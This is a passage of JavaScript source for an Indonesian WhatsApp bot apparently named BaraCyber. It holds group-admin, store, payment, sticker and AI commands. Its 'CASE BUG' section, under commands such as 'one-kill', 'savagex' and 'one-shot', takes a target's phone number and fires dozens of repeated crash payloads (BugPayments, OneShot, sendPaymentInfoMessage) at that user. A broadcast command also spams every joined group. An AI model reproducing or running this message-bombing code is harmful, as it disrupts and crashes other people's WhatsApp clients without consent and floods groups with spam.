‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
HadzzModa.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case "kick": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin:(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await BaraCybeer.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case 'closegroup': {
if (!isGroup) return reply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return reply('Khusus Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin Bego`)
if (!args[0]) return reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
BaraCybeer.groupSettingUpdate(m.chat, 'announcement')
reply(`Waktu Telah Tiba!\nGrup Ditutup Oleh Bot Dikarenakan Tidak Ada Yg Menjaga Grup🙏\nGrup Akan Dibuka Sesuai Waktu Yg Ditentukan Oleh Admin`)
}, timer)
}
break
case 'opengroup': {
if (!isGroup) return reply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return reply('Khusus Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin Bego`)
if (!args[0]) return reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
BaraCybeer.groupSettingUpdate(m.chat, 'not_announcement')
reply(`Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan`)
}, timer)
}
break
case "demote": {
if (!isPremium) return reply(mess.only.premium)
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin:(`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await BaraCybeer.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "promote": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin:(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await BaraCybeer.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
//============= CASE STORE =============//
case "jpmpromosi": case "jpmpromo": case "jpm3": {
if (!isOwner) return reply(mess.only.owner)
if (!text && !m.quoted) return m.reply("teksnya atau replyteks")
var teks = m.quoted ? m.quoted.text : text
let total = 0
let allfetch = await BaraCybeer.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
let teksnya = teks
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6283896252486\",\"merchant_url\":\"https://whatsapp.com/channel/0029VafZAPi2ER6id5fxrC24"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"YouTube Owner\",\"url\":\"${linkyt}\",\"merchant_url\":\"https://youtube.com/@Baradeveloper_\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testi Di whatsapp\",\"url\":\"${isLink}\",\"merchant_url\":\"https://whatsapp.com/channel/0029VafZAPi2ER6id5fxrC24\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"Donate My Dev🙏\",\"url\":\"https://l.top4top.io/p_31903ydpr1.jpg\",\"merchant_url\":\"https://l.top4top.io/p_31903ydpr1.jpg\"}"
}]
})
})} 
}}, {userJid: m.sender, quoted: m})
for (let jid of usergc) {
try {
await BaraCybeer.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case 'payment': {
let teks = `${monospace("ALL  PAYMENT")}

*(E-WALLET)*

1. DANA
- ${dana}
2. Gopay
- ${gopay}
3. OVO
- ${ovo}

Harap Setelah Transfer Anda Harus Mengasih Bukti Pembayaran Agar Di Verifikasi Oleh Owner, Tanks For You❤

© ${storename}`
BaraCybeer.sendMessage(from, { 
text: teks,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": false,
"title": `QRIS? KLIK DISINI`,
"body": `Date : ${wib}, ${tanggal}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnailUrl": "https://l.top4top.io/p_31903ydpr1.jpg",
"sourceUrl": `${qris}`
}
}
},{ 
quoted: fkontak })
await sleep(1500)
}
      break
case "danamasuk": {
if (!isOwner) return reply(mess.only.owner)
let teks = `*DONE DANA MASUK✅*

Reqname :

▰▰▰▰▰▰▰▰
*Garansi 7 Day*
*Create ${wib}*
*Hari Ini ${hariini}*`
BaraCybeer.sendMessage(from, { text : teks }, { quoted : m })
}
break
case 'proses':{
m.reply('*SIAP PESANAN ANDA AKAN KAMI PROSES JADI DI MOHON UNTUK MENUNGGU SEBENTAR YA MEK*')
BaraCybeer.sendMessage("6283896252486@s.whatsapp.net", { text: "BANG BARA ADA YANG TRX NIH CEPETAN PROSES NANTI BUYER NGAMOK", contextInfo: { forwardingScore: 9999, isForwarded: true }})
}
break
case 'done': case 'd': {
if (!isOwner) return reply(`Njirr Lu siapa Cuk`)
let s = text.split(',')
let barang = s[0]
let nominal = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} barang,nominal`)
if (!barang) return reply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} vipies,60000`)
if (!nominal) return reply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} panel,1000`)
text_done = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」

📦 Barang : ${barang}
💸 Nominal : ${nominal}
📆 Tanggal : ${wib}
🕰️ Waktu : ${time2}
✨ Status : Berhasil

𝗧𝗲𝗿𝗶𝗺𝗮𝗸𝗮𝘀𝗶𝗵 𝗧𝗲𝗹𝗮𝗵 𝗢𝗿𝗱𝗲𝗿 𝗗𝗶 ${storename}☺️`
await BaraCybeer.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: `${nominal}*100000`,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_done,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case "sticker": 
case "stiker":
case "s": {
if (!isOwner) return reply(mess.only.owner)
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await BaraCybeer.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await BaraCybeer.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
// BATAS

//============= CASE OWNER =============//
case "owner": {

if (!isPremium) return reply('Mau Ngapain Kocak😂')
const repf = await BaraCybeer.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
BaraCybeer.sendMessage(from, { text : `Hai babu @${sender.split("@")[0]}, Nih Owner Gw Kontol`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62xxxxxxxxxx`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await BaraCybeer.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62xxxxxxxxxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case 'setowner': {
if (!isOwner) return reply('kusus owner')
if (!text) return reply(`Contoh : ${prefix + command} no owner`)
global.owner = text.split("|")[0]
 reply(`Exif berhasil diubah menjadi\n\n• noOwner : ${global.owner}`)
}
break
case 'self': {
if (!isOwner) return reply(mess.only.owner)
BaraCybeer.public = false
reply('succes')
}
break
case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62xxxxxxxxxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await BaraCybeer.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62xxxxxxxxxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
case 'public': {
if (!isOwner) return reply(mess.only.owner)
BaraCybeer.public = true
reply('succes')
}
break
case "qc": {
if (!isOwner)return reply(mess.only.owner)
if (!quoted){
const getname = await BaraCybeer.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
BaraCybeer.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
BaraCybeer.sendStimg(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} text atau reply pesan dengan perintah ${prefix+command}`)
}
}
break
// BATAS

//============= CASE AI =============//
case 'mangap': {
replymenu(`Makasi Kakak ${pushname} Atas Pujiannya`) 
}
break
case 'ai':
case 'openai':
case 'bara-ai':
case 'open-ai': {
	if (!text) return replymenu(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`);  
await BaraCybeer.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://widipe.com/openai?text=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> BaraCyber - AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./image/nulll.jpg')}, { upload: BaraCybeer.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Nice BaraCyber - AI✨","id":".mangap"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363321008297293@newsletter',
                  newsletterName: namabot,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await BaraCybeer.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replymenu("`*Error Kak :(*`")
}
}
break
// BATAS

//============= CASE BUG =============//
case 'xbara': {
if (!isPremium) return reply(mess.only.premium)
if (args.length < 1) return reply(`Example ${prefix + command} nomer`)
let bijipler = q.replace(/[^0-9]/g, 
)
let sections = [{
title: '#~ 𓊈 Pilih Bug 𓊉 ~#',
highlight_label: 'Recomended By 𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥',
rows: [{
title: 'Spesialv1',
description: `Display Send Bug`, 
id: `.xbeta ${bijipler}`
},
{
title: 'Spesialv2',
highlight_label: 'Medium',
description: "Display Send Bug", 
id: `.xpayment ${bijipler}`
},
{
title: 'Spesialv3', 
highlight_label: 'Hard',
description: "Display Send Bug", 
id: `.one-shot ${bijipler}`
}]
}]

let listMessage = {
    title: 'Pilih Sayang', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "120363321008297293@newsletter",
 newsletterName: 'Powered By BaraCyber', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: BaraCybeer.decodeJid(BaraCybeer.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: (`𝐏𝐢𝐥𝐢𝐡 𝐋𝐢𝐬𝐭 𝐁𝐮𝐠`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${namabot}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: '',
 subtitle: "BaraCyber",
 hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./image/mengkece.jpg")}, { upload: BaraCybeer.waUploadToServer })) 
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
},  {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"MY YOUTUBE\",\"url\":\"https://youtube.con/@Baradeveloper_\",\"merchant_url\":\"https://youtube.com/@Baradeveloper_\"}"
 },
 ]
 })
 })
 }
 }
}, {})

await BaraCybeer.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'one-kill':
            case "doublekill":
            case "tripexkill":
            case "maniacx":
            case "savagex": {
                if (!isPremium) return reply(mess.only.premium)
                if (!q) return reply(`Example : ${prefix + command} 62xxxxxxxxxx`)
                let number = q.replace(/[^0-9]/g, '');
                if (number.startsWith('0')) return reply(`Example : ${prefix + command} 62838××××`)
                let target = number + '@s.whatsapp.net';
                await reply("In process..")
                for (let i = 0; i < 1; i++) {
                    await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
                }
            }
                break
                case 'one-shot': {
                if (!isPremium) return reply(mess.only.premium)
                if (!q) return reply(`Example : ${prefix + command} 62xxxxxxxxxx`)
                let number = q.replace(/[^0-9]/g, '');
                if (number.startsWith('0')) return reply(`Example : ${prefix + command} 62xxxxxxxxxx`)
                let target = number + '@s.whatsapp.net';
                await reply("In process..")
                await OneShot(target)
                await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
